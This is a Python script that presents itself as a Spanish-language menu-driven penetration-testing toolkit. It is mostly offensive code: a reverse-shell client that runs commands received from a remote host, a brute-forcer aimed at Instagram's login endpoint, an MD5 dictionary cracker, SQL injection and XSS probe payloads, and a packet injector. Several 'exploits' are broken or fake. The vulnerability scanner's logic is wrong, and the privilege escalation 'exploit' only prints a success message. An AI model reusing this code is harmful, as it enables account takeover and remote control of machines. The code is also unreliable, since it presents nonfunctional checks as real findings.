import os
import socket
import struct
import textwrap
import requests
import hashlib
import dns.resolver
from scapy.all import *

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    banner = """
██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗██╗███╗   ██╗ ██████╗     ████████╗ ██████╗ ██╗   ██╗██╗  ██╗   ██╗
██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██║████╗  ██║██╔════╝     ╚══██╔══╝██╔═══██╗██║   ██║██║  ╚██╗ ██╔╝
██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║   ██║██╔██╗ ██║██║  ███╗       ██║   ██║   ██║██║   ██║██║   ╚████╔╝ 
██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║   ██║██║╚██╗██║██║   ██║       ██║   ██║   ██║██║   ██║██║    ╚██╔╝  
██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║   ██║██║ ╚████║╚██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗██║   
╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝   
                                                                                                                               
    """
    print(banner)

def display_menu():
    tools = [
        "Herramienta 1: Escáner de Puertos",
        "Herramienta 2: Sniffer de Red",
        "Herramienta 3: Escáner de Vulnerabilidades",
        "Herramienta 4: Cracker de Contraseñas",
        "Herramienta 5: Escáner de Aplicaciones Web",
        "Herramienta 6: Enumeración DNS",
        "Herramienta 7: Inyector de Paquetes",
        "Herramienta 8: Framework de Explotación",
        "Herramienta 9: Shell Reversa",
        "Herramienta 10: Fuerza Bruta de Contraseñas de Instagram",
        "Herramienta 11: Escáner de Redes Inalámbricas",
        "Herramienta 12: Suplantación ARP",
        "Herramienta 13: Herramienta de Inyección SQL",
        "Herramienta 14: Escáner XSS",
        "Herramienta 15: Fuerza Bruta de Directorios",
        "Herramienta 16: Enumerador de Subdominios",
        "Herramienta 17: Escáner SSL",
        "Herramienta 18: Kit de Ingeniería Social",
        "Herramienta 19: Herramienta de Análisis de Malware",
        "Herramienta 20: Kit de Herramientas Forenses"
    ]
    print("Seleccione una herramienta para usar:")
    for tool in tools:
        print(tool)

def port_scanner():
    clear_terminal()
    display_banner()
    target = input("Ingrese la dirección IP objetivo: ")
    start_port = int(input("Ingrese el puerto inicial: "))
    end_port = int(input("Ingrese el puerto final: "))
    
    print(f"Escaneando puertos del {start_port} al {end_port} en {target}...")
    
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"Puerto {port}: Abierto")
        sock.close()
    
    input("Presione Enter para volver al menú...")
    main()

def network_sniffer():
    clear_terminal()
    display_banner()
    conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    
    try:
        while True:
            raw_data, addr = conn.recvfrom(65536)
            dest_mac, src_mac, eth_proto, data = ethernet_frame(raw_data)
            print('\nEthernet Frame:')
            print(f'Destination: {dest_mac}, Source: {src_mac}, Protocol: {eth_proto}')
    except KeyboardInterrupt:
        pass
    
    input("Presione Enter para volver al menú...")
    main()

def ethernet_frame(data):
    dest_mac, src_mac, proto = struct.unpack('! 6s 6s H', data[:14])
    return get_mac_addr(dest_mac), get_mac_addr(src_mac), socket.htons(proto), data[14:]

def get_mac_addr(bytes_addr):
    bytes_str = map('{:02x}'.format, bytes_addr)
    return ':'.join(bytes_str).upper()

def vulnerability_scanner():
    clear_terminal()
    display_banner()
    target = input("Ingrese la URL objetivo: ")
    print(f"Escaneando vulnerabilidades en {target}...")
    
    common_vulnerabilities = [
        "SQL Injection",
        "Cross-Site Scripting (XSS)",
        "Command Injection",
        "Directory Traversal"
    ]
    
    for vulnerability in common_vulnerabilities:
        print(f"Verificando {vulnerability}...")

        response = requests.get(target)
        if response.status_code == 200:
            print(f"{vulnerability} no encontrado.")
        else:
            print(f"{vulnerability} encontrado!")
    
    input("Presione Enter para volver al menú...")
    main()

def password_cracker():
    clear_terminal()
    display_banner()
    hash_to_crack = input("Ingrese el hash de la contraseña a crackear: ")
    wordlist_path = input("Ingrese la ruta del archivo de diccionario: ")

    try:
        with open(wordlist_path, 'r') as wordlist:
            for word in wordlist:
                word = word.strip()
                hashed_word = hashlib.md5(word.encode()).hexdigest()
                if hashed_word == hash_to_crack:
                    print(f"Contraseña encontrada: {word}")
                    break
            else:
                print("Contraseña no encontrada en el diccionario.")
    except FileNotFoundError:
        print("Archivo de diccionario no encontrado.")
    
    input("Presione Enter para volver al menú...")
    main()

def web_application_scanner():
    clear_terminal()
    display_banner()
    target = input("Ingrese la URL objetivo: ")
    print(f"Escaneando la aplicación web en {target}...")

    def check_sql_injection(url):
        payloads = ["'", "' OR 1=1 --", "' OR 'a'='a"]
        for payload in payloads:
            response = requests.get(url + payload)
            if "error" in response.text or "syntax" in response.text:
                print(f"Posible SQL Injection encontrado con payload: {payload}")
                return
        print("No se encontró SQL Injection.")

    def check_xss(url):
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
        for payload in payloads:
            response = requests.get(url + payload)
            if payload in response.text:
                print(f"Posible XSS encontrado con payload: {payload}")
                return
        print("No se encontró XSS.")

    def check_directory_traversal(url):
        payloads = ["../", "../../", "../../../"]
        for payload in payloads:
            response = requests.get(url + payload)
            if "root:" in response.text or "boot.ini" in response.text:
                print(f"Posible Directory Traversal encontrado con payload: {payload}")
                return
        print("No se encontró Directory Traversal.")

    check_sql_injection(target)
    check_xss(target)
    check_directory_traversal(target)

    input("Presione Enter para volver al menú...")
    main()

def dns_enumeration():
    clear_terminal()
    display_banner()
    target = input("Ingrese el dominio objetivo: ")
    print(f"Enumerando DNS para {target}...")

    def get_dns_records(domain):
        try:
            records = dns.resolver.resolve(domain, 'A')
            for record in records:
                print(f"A Record: {record.to_text()}")
        except dns.resolver.NoAnswer:
            print("No A records found.")
        except dns.resolver.NXDOMAIN:
            print("Domain does not exist.")
        except Exception as e:
            print(f"Error: {e}")

    def get_mx_records(domain):
        try:
            records = dns.resolver.resolve(domain, 'MX')
            for record in records:
                print(f"MX Record: {record.exchange} - Priority: {record.preference}")
        except dns.resolver.NoAnswer:
            print("No MX records found.")
        except dns.resolver.NXDOMAIN:
            print("Domain does not exist.")
        except Exception as e:
            print(f"Error: {e}")

    def get_ns_records(domain):
        try:
            records = dns.resolver.resolve(domain, 'NS')
            for record in records:
                print(f"NS Record: {record.to_text()}")
        except dns.resolver.NoAnswer:
            print("No NS records found.")
        except dns.resolver.NXDOMAIN:
            print("Domain does not exist.")
        except Exception as e:
            print(f"Error: {e}")

    get_dns_records(target)
    get_mx_records(target)
    get_ns_records(target)

    input("Presione Enter para volver al menú...")
    main()

def packet_injector():
    clear_terminal()
    display_banner()
    target_ip = input("Ingrese la dirección IP objetivo: ")
    target_port = int(input("Ingrese el puerto objetivo: "))
    payload = input("Ingrese el payload a enviar: ")

    packet = IP(dst=target_ip) / TCP(dport=target_port) / Raw(load=payload)
    send(packet)
    print(f"Paquete enviado a {target_ip}:{target_port} con payload: {payload}")

    input("Presione Enter para volver al menú...")
    main()

def exploit_framework():
    clear_terminal()
    display_banner()
    print("Framework de Explotación")
    print("Seleccione un exploit para usar:")
    exploits = [
        "Exploit 1: Buffer Overflow",
        "Exploit 2: Remote Code Execution",
        "Exploit 3: Privilege Escalation"
    ]
    for exploit in exploits:
        print(exploit)
    
    choice = input("Ingrese el número del exploit que desea usar: ")
    if choice == "1":
        buffer_overflow_exploit()
    elif choice == "2":
        remote_code_execution_exploit()
    elif choice == "3":
        privilege_escalation_exploit()
    else:
        print("Exploit no implementado aún.")
    
    input("Presione Enter para volver al menú...")
    main()

def buffer_overflow_exploit():
    target_ip = input("Ingrese la dirección IP objetivo: ")
    target_port = int(input("Ingrese el puerto objetivo: "))
    payload = "A" * 1000 
    packet = IP(dst=target_ip) / TCP(dport=target_port) / Raw(load=payload)
    send(packet)
    print(f"Exploit de Buffer Overflow enviado a {target_ip}:{target_port}")

def remote_code_execution_exploit():
    target_ip = input("Ingrese la dirección IP objetivo: ")
    command = input("Ingrese el comando a ejecutar: ")
    payload = f"$(echo {command})" 
    packet = IP(dst=target_ip) / TCP(dport=80) / Raw(load=payload)
    send(packet)
    print(f"Exploit de Remote Code Execution enviado a {target_ip} con comando: {command}")

def privilege_escalation_exploit():
    print("Ejecutando exploit de Privilege Escalation...")
    print("Exploit de Privilege Escalation ejecutado.")

def reverse_shell():
    clear_terminal()
    display_banner()
    target_ip = input("Ingrese la dirección IP del servidor: ")
    target_port = int(input("Ingrese el puerto del servidor: "))

    def connect_to_server(ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            output = os.popen(command).read()
            s.send(output.encode())
        s.close()

    connect_to_server(target_ip, target_port)
    print(f"Conectado a {target_ip}:{target_port}")

    input("Presione Enter para volver al menú...")
    main()

def instagram_brute_force():
    clear_terminal()
    display_banner()
    username = input("Ingrese el nombre de usuario de Instagram: ")
    wordlist_path = input("Ingrese la ruta del archivo de diccionario: ")

    def attempt_login(username, password):
        session = requests.Session()
        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        }
        data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}'
        }
        response = session.post(login_url, headers=headers, data=data)
        return response

    try:
        with open(wordlist_path, 'r') as wordlist:
            for word in wordlist:
                word = word.strip()
                response = attempt_login(username, word)
                if response.status_code == 200 and 'authenticated' in response.json() and response.json()['authenticated']:
                    print(f"Contraseña encontrada: {word}")
                    break
            else:
                print("Contraseña no encontrada en el diccionario.")
    except FileNotFoundError:
        print("Archivo de diccionario no encontrado.")
    
    input("Presione Enter para volver al menú...")
    main()

def wireless_network_scanner():
    clear_terminal()
    display_banner()
    print("Escáner de Redes Inalámbricas no implementado aún.")
    input("Presione Enter para volver al menú...")
    main()

def arp_spoofing():
    clear_terminal()
    display_banner()
    print("Suplantación ARP no implementado aún.")
    input("Presione Enter para volver al menú...")
    main()

def sql_injection_tool():
    clear_terminal()
    display_banner()
    print("Herramienta de Inyección SQL no implementado aún.")
    input("Presione Enter para volver al menú...")
    main()

def xss_scanner():
    clear_terminal()
    display_banner()
    print("Escáner XSS no implementado aún.")
    input("Presione Enter para volver al menú...")
    main()

def directory_brute_forcer():
    clear_terminal()
    display_banner()
    print("Fuerza Bruta de Directorios no implementado aún.")
    input("Presione Enter para volver al menú...")
    main()

def subdomain_enumerator():
    clear_terminal()
    display_banner()
    print("Enumerador de Subdominios no implementado aún.")
    input("Presione Enter para volver al menú...")
    main()

def ssl_scanner():
    clear_terminal()
    display_banner()
    print("Escáner SSL no implementado aún.")
    input("Presione Enter para volver al menú...")
    main()

def social_engineering_toolkit():
    clear_terminal()
    display_banner()
    print("Kit de Ingeniería Social no implementado aún.")
    input("Presione Enter para volver al menú...")
    main()

def malware_analysis_tool():
    clear_terminal()
    display_banner()
    print("Herramienta de Análisis de Malware no implementado aún.")
    input("Presione Enter para volver al menú...")
    main()

def forensic_toolkit():
    clear_terminal()
    display_banner()
    print("Kit de Herramientas Forenses no implementado aún.")
    input("Presione Enter para volver al menú...")
    main()

def main():
    clear_terminal()
    display_banner()
    display_menu()
    choice = input("Ingrese el número de la herramienta que desea usar: ")
    if choice == "1":
        port_scanner()
    elif choice == "2":
        network_sniffer()
    elif choice == "3":
        vulnerability_scanner()
    elif choice == "4":
        password_cracker()
    elif choice == "5":
        web_application_scanner()
    elif choice == "6":
        dns_enumeration()
    elif choice == "7":
        packet_injector()
    elif choice == "8":
        exploit_framework()
    elif choice == "9":
        reverse_shell()
    elif choice == "10":
        instagram_brute_force()
    elif choice == "11":
        wireless_network_scanner()
    elif choice == "12":
        arp_spoofing()
    elif choice == "13":
        sql_injection_tool()
    elif choice == "14":
        xss_scanner()
    elif choice == "15":
        directory_brute_forcer()
    elif choice == "16":
        subdomain_enumerator()
    elif choice == "17":
        ssl_scanner()
    elif choice == "18":
        social_engineering_toolkit()
    elif choice == "19":
        malware_analysis_tool()
    elif choice == "20":
        forensic_toolkit()
    else:
        print("Herramienta no implementada aún.")
        input("Presione Enter para volver al menú...")
        main()

if __name__ == "__main__":
    main()
